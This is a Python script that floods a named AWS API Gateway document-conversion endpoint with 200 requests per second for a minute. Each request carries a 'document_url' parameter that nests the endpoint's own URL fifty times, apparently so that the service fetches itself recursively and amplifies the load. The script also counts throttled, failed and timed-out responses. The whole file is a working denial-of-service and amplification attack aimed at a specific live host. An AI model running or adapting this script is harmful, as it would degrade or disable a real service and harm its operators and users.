import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
import threading


TARGET = "https://4megsr9cc0.execute-api.us-east-1.amazonaws.com/Prod/api/convert"
BASE = "https://4megsr9cc0.execute-api.us-east-1.amazonaws.com/Prod/api/convert?document_url="

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*"
}


# Session tuning
session = requests.Session()
adapter = HTTPAdapter(pool_connections = 300, pool_maxsize = 300)
session.mount("https://", adapter)
session.mount("http://", adapter)

print_lock = threading.Lock()


# Metrics
stats = {
    "success": 0,
    "errors": 0,
    "timeouts": 0,
    "throttled": 0,
    "total_time": 0
}


def build_payload(depth) :
    payload = ""
    for _ in range(depth) :
        payload += BASE
    return f"{TARGET}?document_url={payload}"


def send_request(req_id) :
    url = build_payload(50)

    try :
        start = time.time()

        r = session.get(
            url,
            headers = HEADERS,
            allow_redirects = False,
            timeout = 15
        )

        elapsed = time.time() - start

        # Update metrics
        with print_lock :
            stats["total_time"] += elapsed

            if r.status_code == 200 or r.status_code == 302 :
                stats["success"] += 1
            elif r.status_code == 429 :
                stats["throttled"] += 1
            else :
                stats["errors"] += 1

            print(f"[{req_id}] -> {r.status_code} | {round(elapsed, 2)}s")

    except requests.exceptions.Timeout :
        with print_lock :
            stats["timeouts"] += 1
            print(f"[{req_id}] -> TIMEOUT")

    except Exception as e :
        with print_lock :
            stats["errors"] += 1
            print(f"[{req_id}] -> ERROR ({str(e)[:50]})")


def run_test(duration, rps) :
    total_requests = duration * rps

    print(f"\n[+] Sending {total_requests} requests ({rps}/sec for {duration}s)\n")

    with ThreadPoolExecutor(max_workers = 200) as executor :
        futures = []

        for second in range(duration) :
            for i in range(rps) :
                req_id = second * rps + i
                futures.append(executor.submit(send_request, req_id))

            time.sleep(1)

        # Wait for all to complete
        for _ in as_completed(futures) :
            pass

    # Final stats
    print("\n========== RESULTS ==========")
    total = sum([stats["success"], stats["errors"], stats["timeouts"], stats["throttled"]])

    if total > 0 :
        avg_time = stats["total_time"] / total
    else :
        avg_time = 0

    print(f"Total Requests   : {total}")
    print(f"Success (200/302): {stats['success']}")
    print(f"Errors           : {stats['errors']}")
    print(f"Timeouts         : {stats['timeouts']}")
    print(f"Throttled (429)  : {stats['throttled']}")
    print(f"Avg Response Time: {round(avg_time, 2)}s")

    print("\n========== DONE ==========")


# Run test
run_test(60, 200)
